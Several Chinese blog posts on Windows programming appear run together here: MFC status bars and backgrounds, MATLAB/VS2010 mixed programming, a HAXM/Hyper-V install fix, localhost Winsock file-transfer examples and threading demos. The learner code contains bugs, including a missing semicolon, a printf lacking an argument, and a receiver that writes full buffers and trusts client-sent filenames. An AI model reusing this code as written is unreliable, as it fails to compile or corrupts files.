这两天试了不想再用恶心的VC6.0，改用VS2010试了一下，发现区别不大，但是在细节上，貌似VS2010可以使用原来的MFC类，但是似乎总是有问题，不太好用。今天就遇到一个问题，本来是最简单的在状态栏显示鼠标坐标，但是使用CStatusBar指针的的SetPaneText()方法时死活不对，总是报错，Google了半天貌似没有遇到这个问题的，当时我就哭了。。。，难道我的人品这么背，不甘心下，有看了一下CMainFrame代码，发现使用的竟然是CMFCStatusBar，难道这是原因？抱着试一试的想法，把CStatusBar换成CMFCStatusBar，运行一下，没问题了。看来有问题不要怕，多看看代码，问题自然解决。。。
附上在状态栏添加鼠标坐标的过程：
1.在String Table中添加一个新项，名字为IDS_MOUSE_POINT（具体什么名字可以随便起），将其Caption设为"X=0000,Y=0000"（不包括引号）
2.在MainFrm.cpp中indicators声明处添加IDS_MOUSE_POINT,注意不要添加到第一行（如果添加后果我不太清楚），代码如下：



?

1
2
3
4
5
6
7
8



static
UINT indicators[] =
{
    ID_SEPARATOR,          
// 状态行指示器
    ID_INDICATOR_CAPS,
    ID_INDICATOR_NUM,
    ID_INDICATOR_SCRL,
    IDS_MOUSE_POINT,
};





3.使用Class Wizard添加WM_MOUSEMOVE的相应函数
4.在相应函数中添加代码如下（注意由于我是基于MapX做二次开发，这是MapX的mousemove的相应函数，不过和windows的大同小异，可以参考使用）：




?

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23



void 
CMy2008302590145View::MouseMoveMapMain(short
Button, short
Shift, float 
X, float Y)
{
    // TODO: Add your message handler code here
    double
dX,dY;
    m_MapX.ConvertCoord(&X, &Y, &dX, &dY, miScreenToMap);//将屏幕坐标换算为地理坐标
 
//  CString strMousePos;
//  strMousePos.Format(_T("X=%.4f,Y=%.4F"),dX,dY);
 
    char* strMousePos;
    strMousePos =
new char[256];
    sprintf(strMousePos,
"X=%.4f,Y=%.4f", dX, dY);
    CString outStr;
    outStr = strMousePos;
    int
len = outStr.GetLength();
 
    CMainFrame*   pFrame   =   (CMainFrame*)   AfxGetMainWnd();

    CMFCStatusBar*   pStatusBar   =   (CMFCStatusBar*)   pFrame-> GetDescendantWindow(AFX_IDW_STATUS_BAR);
 
    pStatusBar->SetPaneWidth(pStatusBar->CommandToIndex(IDS_MOUSE_POINT), len * 6);
    pStatusBar->SetPaneText(pStatusBar->CommandToIndex(IDS_MOUSE_POINT), outStr,TRUE);
 
}





这样就完成了，代码比较简单，没写注释，不太明白的话可以查一下MSDN




 
才知道问题原因。
然后在view的消息响应函数中就可以修改了，注意注释的代码就是原来修改不成功的代码。
	CString str;
	str.Format("%f",end);
	 //CMainFrame *pFrame=(CMainFrame*)GetParent();
	 //pFrame->mySetStatusBar(str);
	CMainFrame*   pFrame   =   (CMainFrame*)   AfxGetMainWnd(); 
	CMFCStatusBar*   pStatusBar   =   (CMFCStatusBar*)   pFrame-> GetDescendantWindow(AFX_IDW_STATUS_BAR);

	//pStatusBar->SetPaneWidth(1, str.GetLength() * 2);
	str = "分割用时： "+ str + " ms ";
	pStatusBar->SetPaneText(1, str,TRUE);

 
 









实现效果：

这个其实是一个非常常见的功能，大家都会考虑给自己简单的工程做一个背景界面。其实只要在view类中重载OnEraseBkgnd（）这个函数就好了。
代码如下：
BOOL CdddView::OnEraseBkgnd(CDC* pDC)
{
    // TODO: 在此添加消息处理程序代码和/或调用默认值


    CString string("b.bmp"); 
    HBITMAP hbitmap=(HBITMAP)::LoadImage(AfxGetInstanceHandle(),string, 
        IMAGE_BITMAP,1024,768, LR_CREATEDIBSECTION|LR_LOADFROMFILE); 
    //VERY IMPORTANT:NOT CALL THE SUPER CLASS FUNCTION 
    CPaintDC dc(this); 
    if(hbitmap==NULL) 
        return FALSE; 
    CBitmap bitmap; 
    bitmap.Attach(hbitmap); 
    BITMAP bmp; 
    bitmap.GetBitmap(&bmp); 
    CDC memDc;

    memDc.CreateCompatibleDC(pDC);
    CBitmap* pOldBitmap = memDc.SelectObject(&bitmap);
    CRect rect;
    GetClientRect(&rect);
    pDC->SetStretchBltMode(COLORONCOLOR);//这个模式不设置的话会导致图片严重失真
    pDC->StretchBlt(0,0,rect.Width() ,rect.Height(),
        &memDc,0,0,bmp.bmWidth,bmp.bmHeight,SRCCOPY);
    memDc.SelectObject(pOldBitmap);
    memDc.DeleteDC();                                      //删除DC
    return TRUE; 
}

顺便给工程换个标题栏：
BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
    if( !CFrameWndEx::PreCreateWindow(cs) )
        return FALSE;
    // TODO: 在此处通过修改
    //  CREATESTRUCT cs 来修改窗口类或样式
    cs.style &=~FWS_ADDTOTITLE;

    cs.lpszName = _T("XXX系统");

    return TRUE;
}
加载位图时候有的格式可能还有点问题，下面是讨论贴： 
http://bbs.csdn.net/topics/391027250?page=1#post-399164597 






 matlab代码：
figure('NumberTitle','off','menubar','none','toolbar','none','name','Topo Image'); 
x=0:pi/100:2*pi;
y=2*exp(-0.5*x).*sin(2*pi*x);
plot(x,y)
%figure(1); 

%%
%figure('Visible','off')
%plot([1:100])
%figure(1)


 
 
 
 
代码下面有，添加滚动条的窗口,这个地方主要是一个事件，点击按钮后，调用matlab代码生成的dll进行运算，完后显示的结果窗口显示出来，完后移动窗口到指定位置
void Cmdi_matlab_movewindow20140810View::OnMatlab()
{
	// TODO: 在此添加命令处理程序代码
// 	CProcessCtrl m_process;
// 
// 	m_process.DoModal();
	CProcessCtrl *m_process = new CProcessCtrl();
	m_process->Create(IDD_PROCESS,this);
	m_process->ShowWindow(SW_SHOW);
	m_process->m_processctrl.SetPos(10) ;

	if( !myfunInitialize())
	{
		MessageBox(_T("初始化失败"));
	}

	
	m_process->m_processctrl.SetPos(30) ;
	fun();

	// terminate MCR
	mclTerminateApplication();
	CString wnd_name = "Topo Image";

	m_process->m_processctrl.SetPos(40) ;

	HWND hFig=::FindWindow(NULL,wnd_name);//wnd_name为matlab figure的名称，
	//此处需循环多次才能得到句柄，不知为啥
	while(hFig==NULL)
	{
		hFig=::FindWindow(NULL,wnd_name);

	}
	m_process->m_processctrl.SetPos(60) ;
	//::ShowWindow(hFig, SW_HIDE); 
	ModifyStyle(hFig,WS_POPUP,WS_CHILD,NULL); 

	

	long IStyle=::GetWindowLong(hFig,GWL_STYLE); //获得figure的属性
	
	//ModifyStyle(hFig,WS_POPUP,WS_CHILD,NULL); 

	//CWnd* pMainWnd =AfxGetMainWnd();
	//CRect client_rect;
	CRect figure_rect;
	CWnd *myfigure = GetDlgItem(IDC_STATIC_MATLABWND);

	myfigure->GetClientRect(&figure_rect);
	//pMainWnd->GetClientRect(&client_rect);

	long fig_width=figure_rect.Width();
	long fig_height=figure_rect.Height();

	
	m_process->m_processctrl.SetPos(80) ;

	::SetParent(hFig,myfigure->GetSafeHwnd());//设置figure的父窗口
	::SetWindowLong(hFig,GWL_STYLE,IStyle & (~WS_CAPTION) & (~WS_THICKFRAME));//设置figure的属性，去掉标题栏
	
	::SetWindowPos(hFig,NULL,0,0,fig_width,fig_height,SWP_NOZORDER|SWP_NOACTIVATE);//

	m_process->UpdateData(false);
	m_process->DestroyWindow();

	::ShowWindow(hFig,SW_SHOW);  //显示设置完后的figure
	::SetForegroundWindow(this->m_hWnd);


	//::UpdateWindow(hFig); //刷新
	//::UpdateWindow(myfigure->m_hWnd); //刷新


}
 
 
实现效果：
 

 
之前配置的过程主要参考了下面的链接：
http://blog.csdn.net/stardust94605/article/details/8972064
 
下面是文章内容：
 

vs2010和Matlab R2012b 混合编程



思路：为了实现matlab与C++混合编程，采用由m文件构造动态链接库然后在visual studio中调用的方法。
本人系统：Windows 7旗舰版（32位），VS2010旗舰版，Matlab R2012b    只有R2010b或以上版本才识别VS2010编辑器
 
1. matlab中dll创建
         1.1    m文件编写
          function [ yt ] = myfitline( x,y,m,xrange,t )
         %xy为坐标向量，m为多项式阶数，xrange为显示图上面的坐标范围,t为要求的坐标横轴位置
         %   Detailed explanation goes here
         p=polyfit(x,y,m);%计算各阶系数p1x^m+p2x^(m-1)+....+ pmx+ p(m+1)
         yy=polyval(p,xrange);%计算一个区域内的函数值用于画图
         yt=polyval(p,t);   %  计算指定x下的函数对应的y值
         plot(x,y,'r*',xrange,yy,'b')
         end
        1.2   设置编译器
                     >> mex -setup   选择VS2010
                     >> mbuild -setup  选择VS2010
                     >> mcc -W cpplib:Myfitline -T link:lib myfitline     （这就创建好了）
              其中，mcc是Matlab提供的编译命令，对于这一点，Matlab的帮助说明如下：
               -W lib:string link:lib其中-W是控制编译之后的封装格式，cpplib，是指编译成C++的lib，cpplib冒号后面是指编译的库的名字，-T表示目标，
       link:lib表示要连接到一个库文件的目标，目标的名字是后面的myfitline，即你写的m函数的名字。
              运行完之后，你的目录下面，将会出现以下一些文件：
              Myfitline.cpp
              Myfitline.exp
              Myfitline.dll
              Myfitline.exports
              Myfitline.h
              Myfitline.lib              mccExcludedFiles.log
              readme.txt
              具体每一个文件的意思，请查帮助，这里只说其中很有用的几个：
              Myfitline.dll是编译好的动态库，myfitline这个函数封装在里面，Myfitline.h是对应的头文件，在C里面调用这个函数的时候，需要include这个头文件，
       在这个头文件的最后，你可以看到下面的内容：
              extern LIB_Myfitline_CPP_API void MW_CALL_CONV myfitline(int nargout, mwArray& yt, const mwArray& x,
              const mwArray& y, const mwArray& m, const mwArray& xrange, const mwArray& t);             
              这就是myfitline的C函数的声明。nargout表示输出变量的个数，其他就是对应了m函数的几个变量。
              注意，变量的类型是mwArray，这是Matlab提供的一个特殊的变量类型（在7.0的版本，编译之后，变量类型是mxArray）。mwArray是一个类，具体可以查帮助。
 
2.系统环境配置
 
              Computer - > Properties -> Advanced system settings -> Environment Variables -> User Variables -> path, 添加(MATLAB下为MATLAB
 2012软件安装目录）
              ...\MATLAB\extern\lib\win32\microsoft;
              ...\MATLAB\bin\win32
              Computer - > Properties -> Advanced system settings -> Environment Variables -> System Variables -> path, 添加
              ...\MATLAB\runtime\win32;
              ...\MATLAB\bin;
              ...\MATLAB\extern\lib\win32\microsoft;
              ...\MATLAB\bin\win32

3.vs2010环境配置
 
            ①Property Pages -> VC++ Directories -> Include Directories, 添加(安装目录下)
            ...\MATLAB\extern\include\ 
            ②Property Pages -> VC++ Directories -> Library Directories, 添加
            ...\MATLAB\extern\lib\win32\microsoft
            ③Property Pages -> C/C++ -> General -> Additional Include Directories, 添加
            ...\MATLAB\extern\include\
            ④Property Pages -> Linker -> General -> Additional Library Directories, 添加
            ...\MATLAB\extern\lib\win32\microsoft
           ⑤Property Pages -> Linker -> Input -> Additional Dependencies, 添加
                          libeng.lib
                          libmat.lib
                          libmex.lib
                          libmx.lib
                          mclmcrrt.lib
                          mclmcr.lib
                          Myfitline.lib
    4.vs2010下完成程序
               把刚才生成的*.h *.dll *.lib文件复制到刚刚新建的工程的文件夹下，并且用添加—现有项添加的工程中。（此处的*代表你的m文件名称）
               调用函数 myfitline的文件前要
                            #include "mclmcr.h"
                            #include "matrix.h"
                            #include "mclcppclass.h"
                            #include "Myfitline.h”
              具体程序如下：
              void CNewFeatureofStormView::Onposition()
            {
                 // TODO: 在此添加命令处理程序代码
                 if( !MyfitlineInitialize())
                 {
                     MessageBox(_T("初始化失败"));
                  }
                 // 为变量分配内存空间，可以查帮助mwArray
                  mwArray mwX(5, 1, mxDOUBLE_CLASS); // 5，1表示矩阵的大小（所有maltab只有一种变量，就是矩阵，
                  mwArray mwY(5, 1, mxDOUBLE_CLASS);//为了和Cpp变量接轨，设置成1*5的矩阵，mxDOUBLE_CLASS表示变量的精度）
                  mwArray mwM(1, 1, mxDOUBLE_CLASS);
                  mwArray mwXR(50,1, mxDOUBLE_CLASS);
                  mwArray mwYT(1,1, mxDOUBLE_CLASS);
                  mwArray mwT(1,1, mxDOUBLE_CLASS);
                  int x[5]={432,435,438,441,443};    //样本点坐标
                  int y[5]={136,138,140,145,147};    //
                  int xr[50],m=3,t=446;           //参数设置
                  for (int i=400;i<450;i++)
                  {
                      xr[i-400]=i;
                  }
                  mwX.SetData(x, 5);      //调用类里面的SetData函数给类赋值
                  mwY.SetData(y, 5);
                  mwM.SetData(&m, 1);
                  mwXR.SetData(xr, 50);
                  mwT.SetData(&t, 1);
                  myfitline(1,mwYT,mwX,mwY,mwM,mwXR,mwT);
                  double c = mwYT.Get(1, 1); //调用类里面的Get函数获取取函数返回值
                  CString strNumber;
                  strNumber.Format(_T("%lf"),c);
                  MessageBox(strNumber, _T("坐标"));
                  // 后面是一些终止调用的程序
                  MyfitlineTerminate();
                  // terminate MCR
                 mclTerminateApplication();
            }
 

 
 
 
 






    

      我 的电脑是神舟战神k650c i7 D4，处理器是Intel core i7 4710-MQ，系统是win 10的
我心血来潮想学习一下安卓开发，就首先安装了android studio，但是启动安卓模拟器时候，提示说 intel 的haxm没有安装，但是我在SDK manager 里面没有发现有下载的选项，就在官网：

https://software.intel.com/en-us/android/articles/intel-hardware-accelerated-execution-manager

下载，完后安装，但是出现了一系列问题，那我们就来好好探究一下。
安装时候提示：






注意：
我 的机器，win 10 的hyer-x是开着的，啥时候开的我也忘了
（Hyer-V是一个微软的虚拟机，部署在win 8.x 64位 pro以上版本中，和Windows 2008以上服务器的版本中）
http://www.jb51.net/os/Windows8/105220.html）

此时，用检测软件，http://securable.en.softonic.com/

惊讶发现啊，我的i7处理器虚拟化没有开启。后面我修好后才截图的，所以网上找的图，除了处理器型号不一样其他都一样：




当然，没开虚拟化，intel 的haxm就没法装，我就准备进bios开启，结果一进去瞎了，没这个选项，结果准备刷bios，其实各位，神舟的这款机器VT-x 的选项就是默认开启的，根本不用开，按照网上的帖子就去就瞎了：

http://jingyan.baidu.com/article/60ccbceb61272d64cab1972f.html（如何开启处理器vt虚拟化功能）



最牛逼的莫过于这位仁兄：把intel 的文档都翻了个底朝天：

http://www.crifan.com/adt_haxm_xd_not_supported_this_computer_does_not_support_intel_execute_disable_bit_xd_or_it_is_disable_in_the_bios/comment-page-1/


看到这个帖子后，我恍然大悟，这两个虚拟化技术方案存在冲突啊：

http://jingyan.baidu.com/article/c74d60006edd7c0f6a595d22.html


http://blog.sharechiwai.com/2015/01/vt-not-supported-this-computer-does-not-support-intel-virtualization-tech-nology-vt0x-haxm-cannot-be-installed/


于是在系统中关闭hyer-x，重新检测：ok 一切正常，完后安装haxm，启动虚拟机，一切步入正轨




我们都熟悉的：hello world！










#include<stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>

#pragma comment(lib,"ws2_32.lib")

#define PORT 9999
#define IPADDR "127.0.0.1"
#define BACKLOG 20
#define FILENAME 200
#define LENGTH 200
#define BUFFERSIZE 1024

struct FILEHEAD //FILE-head  struct
{
	char filename[LENGTH];//file name
	//char ext[LENGTH];
	unsigned int length;//the byte of the file

};

struct FILEDATA //FILE-data  struct
{
	char filename[LENGTH];//file name
	char package[BUFFERSIZE];//package data
	unsigned int length;//the byte of the file
	unsigned int index;//index of the package
	
};

void getFileInformation(FILEHEAD file)
{
	printf( "file information :\n" );
	printf( "  Filename: %s\n", file.filename );
	//printf( "  Ext: %s\n", file.ext );
	printf( "  length is btye: %ld btye\n", file.length );
}


int main(int argc, char *argv[])
{
	FILEHEAD filehead;
	FILEDATA filedata;
	WSADATA wsadata;
	WSAStartup(MAKEWORD(2,0),&wsadata);
	SOCKET sock_trans=socket(AF_INET,SOCK_STREAM,0);
	
	memset(&filehead,0,sizeof(filehead));
	memset(&filedata,0,sizeof(filedata));
	
	if (0==sock_trans)
	{
		printf ("socket build faile!!\n");
		exit(1);
	}
	
	printf ("target pc's IP address: 127.0.0.1\n");
	printf("输入文件名(包括路径)：\n");
	scanf("%s",filehead.filename);
	
	//如果正式调试，将服务器端ip写死。
		
	SOCKADDR_IN sockadd;
	sockadd.sin_family=AF_INET;
	sockadd.sin_port=htons(PORT);
	sockadd.sin_addr.S_un.S_addr=inet_addr(IPADDR);
	
	int con_info=connect(sock_trans,(SOCKADDR*)&sockadd,sizeof(sockadd));
	
	if (SOCKET_ERROR==con_info)
	{
		printf ("connect fail!\n");
		exit(1);
	}
	
	//Sleep(100);

	FILE *fp= NULL;
	fp=fopen(filehead.filename,"rb");
	if (NULL==fp)
	{
		printf("cannot open the %s \n",filehead.filename);
		exit(1);
	}
	
	fseek(fp,0l,SEEK_END);//此处将fp移到了文件末尾，要移动回去,不然读文件总是零
	filehead.length=ftell(fp);
	fseek(fp,0l,SEEK_SET);//将文件指针移动回头部

	char ext[LENGTH]={0};
	_splitpath(filehead.filename, NULL, NULL, filehead.filename, ext);//分割文件名
	strcat(filehead.filename,ext);
	strcpy(filedata.filename,filehead.filename);

	getFileInformation(filehead);

	//setFileInformation();
	//freed_return_val=fread(buf,1,1024,fp);//读文件字符
	//char buf[BUFFER];	
	int fread_return_val=0;//文件读出字符的返回值
	Sleep(3000);

	//发送文件头信息
	printf("发送文件头信息...\n");
	send(sock_trans,(char *)&filehead,sizeof(filehead),0);

	//char buf[BUFFERSIZE]={0};
	filedata.index=0;
	printf("发送文件信息...\n");
	while (1)		
		{	
			fread_return_val=fread(filedata.package,1,BUFFERSIZE,fp);
			//fread_return_val=fread(buf,1,BUFFERSIZE,fp);
			if (0==fread_return_val)
			{
				break;
			}
			filedata.index++;
			send(sock_trans,(char *)&filedata,sizeof(filedata),0);
			//send(sock_trans,buf,BUFFERSIZE,0);
			printf("第%d块发送完成!\n",filedata.index);		
		}


	
	
	
	fclose(fp);
	
	closesocket(sock_trans);
	WSACleanup();
	printf("\n发送文件完成...\n");	

	system("pause");
	
	return 0;
	
}


 






#include<stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>

#pragma comment(lib,"ws2_32.lib")

#define PORT 9999
#define IPADDR "127.0.0.1"
#define BACKLOG 20
#define FILENAME 200
#define LENGTH 200
#define BUFFERSIZE 1024

struct FILEHEAD //FILE-head  struct
{
	char filename[LENGTH];//file name
	unsigned int length;//the byte of the file

};

struct FILEDATA //FILE-data  struct
{
	char filename[LENGTH];//file name
	char package[BUFFERSIZE];//package data
	unsigned int length;//the byte of the file
	unsigned int index;//index of the package

};

struct sockaddr_in clientaddr;  //Definition of the external variable for thread function call

void getFileInformation(FILEHEAD file)
{
	printf( "file information :\n" );
	printf( "  Filename: %s\n", file.filename );
	//printf( "  Ext: %s\n", file.ext );
	printf( " the file length is: %ld btye\n", file.length );
}

void showClientinfo()
{
	//获取当前系统时间
	SYSTEMTIME st;
	GetLocalTime(&st);
	char SysDate[30];
	//将systime中的时间转变为字符串存入SysDate[30];
	sprintf(SysDate, "%4d-%2d-%2d %2d:%2d:%2d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
	//Server显示客户端信息
	printf("%s Recv from Client [%s:%d] : %s\n", SysDate, inet_ntoa(clientaddr.sin_addr), ntohs(clientaddr.sin_port));
	//服务器向客户端回显信息
}

DWORD WINAPI requestThread(LPVOID lparam)
{
	FILEHEAD filehead;
	FILEDATA filedata;
	SOCKET newsock=(SOCKET)(LPVOID)lparam;
	//char buf[BUFFERSIZE]={0};
	memset(&filehead,0,sizeof(filehead));
	memset(&filedata,0,sizeof(filedata));

	showClientinfo();

	//printf("等待文件头信息 ...\n");

	int length_file_info=recv(newsock,(char *)&filehead,sizeof(filehead),0);
	if (SOCKET_ERROR==length_file_info)
	{
		printf("receive failed!\n");
		closesocket(newsock);
		return -1;
		
	}
	if (length_file_info<=0)
	{
		exit(1);//异常退出
	}

	getFileInformation(filehead);//打印文件信息

	FILE *fp=NULL;
	fp=fopen(filehead.filename,"wb+");
	if (NULL==fp)
	{
		perror("fail to build the file!!!\n");
		exit(1);
	}
	
	//printf("要接收的文件名为：");
	//printf(filehead.filename);//打印文件名	
	//printf ("\n catch file now....\n");
	
	int recv_length=0;//接收到字节的长度
	
	//Sleep(100);
	
	printf("开始接收...\n");
	filedata.index=0;
	while (1)
	{
		recv_length=recv(newsock,(char *)&filedata,sizeof(filedata),0);
		if (recv_length == SOCKET_ERROR)
		{
			printf("recv failed !\n");
			closesocket(newsock);
			//WSACleanup();
			return -1;
		}
		
		fwrite(filedata.package,1,BUFFERSIZE,fp);
		if (0==recv_length)
		{
			break;
		}
		//printf("第%d块接收成功!\n",filedata.index);
	}
	printf("\n接收完成...\n\n");
	
	fflush(fp);
	fclose(fp);
	fp=NULL;
	
	return 0;
}

int main(int argc,char *argv[])
{
	//初始化winsock版本信息，加载动态链接库(dll)
	WSADATA wsData;
	if (WSAStartup(MAKEWORD(2,2),&wsData)!=0)
	{
		printf("WSAStartup failed !!!\n");
		return -1;
	}
	
	//创建套接字
	SOCKET socklisten;
	if((socklisten=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
	{
		printf("socket failed!!!\n");
		WSACleanup();
		return -1;
	}
	
	//设置服务器地址
	struct sockaddr_in servaddr;
	
	memset(&servaddr,0,sizeof(servaddr));
	servaddr.sin_family=AF_INET;
	servaddr.sin_port=htons(PORT);
	servaddr.sin_addr.S_un.S_addr=inet_addr(IPADDR);
	
	//绑定socket地址结构到监听套接字
	if (bind(socklisten,(sockaddr *)&servaddr,sizeof(servaddr))!=0)
	{
		printf("binding failed!!!\n");
		closesocket(socklisten);
		WSACleanup();
	}
	
	//在server上运行监听
	if (listen(socklisten,20)!=0)
	{
		printf("listen failed !!!\n");
		closesocket(socklisten);
		WSACleanup();
		return -1;
	}
	
	//接收客户端的连接请求
	printf("TCP server is start!!!\n");
	
	//clientaddrlength要有初值，
	int client_addr_length = sizeof(clientaddr);
	memset(&clientaddr,0,client_addr_length);
	SOCKET connect;
	
	//循环等待
	while (1)
	{
		if ((connect=accept(socklisten,(sockaddr *)&clientaddr,&client_addr_length))==INVALID_SOCKET)
		{
			printf("accept failed!!!\n");
			closesocket(connect);
			WSACleanup();
			return -1;
		}
		
		//创建新线程
		DWORD ThreadID;
		CreateThread(NULL,0,requestThread,(LPVOID)connect,0,&ThreadID);
	}
	
	

}

 





 

 
#include<windows.h>
#include<stdio.h>
#include<stdlib.h>

#pragma comment(lib,"ws2_32.lib")

#define PORT 6666
#define IPADDR "127.0.0.1"
#define BACKLOG 20

int main(void)
{

	WSADATA wsadata;
	WSAStartup(MAKEWORD(2,0),&wsadata);
	SOCKET sock_trans=socket(AF_INET,SOCK_STREAM,0);

	if (sock_trans<0)
	{

	perror("socket");
	exit(1);

	}

	SOCKADDR_IN saddr;
	saddr.sin_family=AF_INET;
	saddr.sin_port=htons(PORT);
	saddr.sin_addr.S_un.S_addr=inet_addr(IPADDR);

	int sadlen=sizeof(saddr);

	FILE* fp=NULL;
	fp=fopen("e://test.txt","w+");
	if(fp==NULL)
	{

	perror("open file:");
	exit(4);
	}

	if (bind(sock_trans,(SOCKADDR*)(&saddr),sadlen)==SOCKET_ERROR)
	{

	perror("bind:");
	exit(2);

	}
	else printf ("bind port ok!\n");

	//int vlisten=50;

	if (listen(sock_trans,20)==SOCKET_ERROR)

	{
	perror("listen");
	exit(3);
	}

	else
	printf ("now listenning.....\n");

	//printf ("%d",listen(sock_trans,20));

	int saddrlen=sizeof(saddr);

	SOCKET newsock=accept(sock_trans,(SOCKADDR*)&saddr,&saddrlen);

	printf ("catch file now....");
	char buf[1024]={0};
	ZeroMemory(buf,1024);

	int relen=0;

	//测试程序的酱油语句，无视之。

	//recv(newsock,buf,50,0);

	// printf ("%s",buf);

	// printf ("\nif put this line ,the program is error!");

	Sleep(3000);

	while(1)

	{

	relen=recv(newsock,buf,1024,0);

	fwrite(buf,1,relen,fp);
	printf("接受了一次！\n");


	fflush(fp);

	//ZeroMemory(buf,50);

	if (relen==0)

	{

	break;

	}
	printf("接受了%d次！\n",relen);

	}

	fclose(fp);

	closesocket(newsock);
	closesocket(sock_trans);
	WSACleanup();

	system("pause")

	return 0;

}









#include <stdio.h>
#include <windows.h>
//#include <winsock2.h>
#include <stdlib.h>



#pragma comment(lib, "ws2_32.lib")  

int main(int argc, char *argv[])

{
	WSADATA wsadata;
	WSAStartup(MAKEWORD(2,0),&wsadata);
	unsigned sock_trans=socket(AF_INET,SOCK_STREAM,0);

	if (sock_trans==0)
	{

	printf ("socket build faile!!\n");
	exit(1);

	}

	printf ("target pc's IP address: 127.0.0.1\n");

//如果正式调试，将服务器端ip写死。


	SOCKADDR_IN sockadd;
	sockadd.sin_family=AF_INET;
	sockadd.sin_port=htons(6666);
	sockadd.sin_addr.S_un.S_addr=inet_addr("127.0.0.1");

	int con_info=connect(sock_trans,(SOCKADDR*)&sockadd,sizeof(sockadd));

	if (con_info==SOCKET_ERROR)
	{

	printf ("connect fail!\n");

	//exit(2);

	}

	char buf[1024];

	int freed_return_val=0;

	Sleep(1000);


	FILE *fp;
	printf("file name:");
	char filename[50]={0};
	gets(filename);
	fp=fopen(filename,"rb");
	if (fp==NULL)
	{
		perror("\nopen file error:");
		exit(1);
	}

	//freed_return_val=fread(buf,1,1024,fp);//读文件字符

	while (1)

	{
	freed_return_val=fread(buf,1,1024,fp);
	if (0==freed_return_val)
	{
		break;
	}
	//freed_return_val=fread(buf,1,1024,fp);
	send(sock_trans,buf,freed_return_val,0);

	}

	fclose(fp);

	closesocket(sock_trans);
	WSACleanup();

	return 0;

}
 





// MultiThead.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<windows.h>
#include<iostream>
using namespace std;

DWORD WINAPI Fun1Proc(
					  LPVOID lpParameter	//thread data

					  );

DWORD WINAPI Fun2Proc(
					  LPVOID lpParameter	//thread data

					  );
int index=0;
int tickets=100;
HANDLE hMutex;

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hThread1;
	HANDLE hThread2;
	hThread1=CreateThread(NULL,0,Fun1Proc,NULL,0,NULL);
	hThread2=CreateThread(NULL,0,Fun2Proc,NULL,0,NULL);
	CloseHandle(hThread1);
	CloseHandle(hThread2);

	//while(index++<=100)
	//cout<<"main thread is running\n"<<endl;
	//Sleep(100);
	//getchar();
	//hMutex=CreateMutex(NULL,FALSE,NULL);

	hMutex=CreateMutex(NULL,TRUE,"tickets");
	if(hMutex)//单例模式
	{
		if(ERROR_ALREADY_EXISTS==GetLastError())//看这个互斥对象是否已经创建出来了
		{
			cout<<"only instance can run!!!"<<endl;
			return 0;
		}
	}

	WaitForSingleObject(hMutex,INFINITE);
	ReleaseMutex(hMutex);
	ReleaseMutex(hMutex);
    Sleep(4000);//主线程放弃了执行时间



	system("pause");
	return 0;
}

DWORD WINAPI Fun1Proc(
	LPVOID lpParameter	//thread data

					  )
{
	/*
	while(index++<=100)
	cout<<"thread1 is running"<<endl;
	return 0;
	
	while(true)
	{
		WaitForSingleObject(hMutex,INFINITE);//有信号状态，
		if(tickets>0)
		{
			cout<<"thread1 sell ticket :"<<tickets--<<endl;

		}
		else 
			break;
		ReleaseMutex(hMutex);//好像是可以自动释放的
	}
	*/

	WaitForSingleObject(hMutex,INFINITE);
	cout<<"thread1 is running"<<endl;
	return 0;
}
DWORD WINAPI Fun2Proc(
	LPVOID lpParameter	//thread data

					  )
{
	/*
	while(index++<=100)
	cout<<"thread2 is running"<<endl;
	return 0;
	
	while(true)
	{
		WaitForSingleObject(hMutex,INFINITE);
		if(tickets>0)
		{
			cout<<"thread2 sell ticket :"<<tickets--<<endl;

		}
		else 
			break;
		ReleaseMutex(hMutex);
	}
	*/
	WaitForSingleObject(hMutex,INFINITE);
	cout<<"thread2 is running"<<endl;
	return 0;
}


但是不知道，为啥，结果和孙鑫视频里的结果不一样。
                                    





《多核程序设计技术》
第五章——线程api，一个使用windows事件的线程应用程序，vs2008下编译调试通过。
// 线程通信机制.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#define  NUM_THREADS 10
#include <windows.h>
#include <stdio.h>
#include <process.h>

typedef struct
{
 int Id;
 HANDLE hTerminate;

}ThreadArgs;

unsigned __stdcall ThreadFunc(void *pArgs)
{
	HANDLE hTerminate = ((ThreadArgs *)pArgs)->hTerminate;//参数转换
	int id = ((ThreadArgs *)pArgs)->Id;

	//运行到我们被告知需要终止的时候
	while(1)
	{
		//检查我们是否需要终止
		if(WaitForSingleObject(hTerminate,0) == WAIT_OBJECT_0)
		{
			//终止线程--我们调用ResetEvent来讲终止的线程返回到非激发状态之后，推出while循环
			printf("Terminating Thread %d \n",id);
			ResetEvent(hTerminate);
			break;
		}
		
		//我们现在可以处理我们的工作，模拟这个情况，假设工作需要1秒钟来做线程需要做的工作

		Sleep(1000);

	}

	_endthreadex(0);

	return 0;

}

int main(int argc ,char * argv[])
{
	unsigned int threadID[NUM_THREADS];
	HANDLE hThread[NUM_THREADS];
	ThreadArgs threadArgs[NUM_THREADS];

	//创建10个线程 
	for(int i =0 ; i < NUM_THREADS ; i++)
	{
		threadArgs[i].Id = i;
		threadArgs[i].hTerminate = CreateEvent(NULL, TRUE, FALSE, NULL);
		hThread[i] = (HANDLE)_beginthreadex(NULL, 0, &ThreadFunc, &threadArgs[i], 0, &threadID[i]);
	}

	printf("To kill a thread (gracefully), press 0-9, then <Enter>.\n");
	printf("Press any other key to exit .\n");

	while (1)
	{
		int c = getc(stdin);
		if (c == '\n')
		{
			continue;
		}
		if (c<'0'||c>'9')
		{
			break;
		}
		SetEvent(threadArgs[c - '0'].hTerminate);
	}
	return 0;
}



 
标注与解释：
WaitForXXX（）可能在事件、作业、互斥量、进程、信号量、线程、定时器、以及其他对象上等待。
TerminateThread（）函数也可以用来终止线程，但是线程会立即终止，其没有机会释放已经获得的资源
 
windows获取系统处理器的基本信息：
#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>

int _tmain(int argc, _TCHAR* argv[])
{
	SYSTEM_INFO sysInfo;
	GetSystemInfo( &sysInfo );

	//打印数据项
	printf("Systme hardware information : \n");

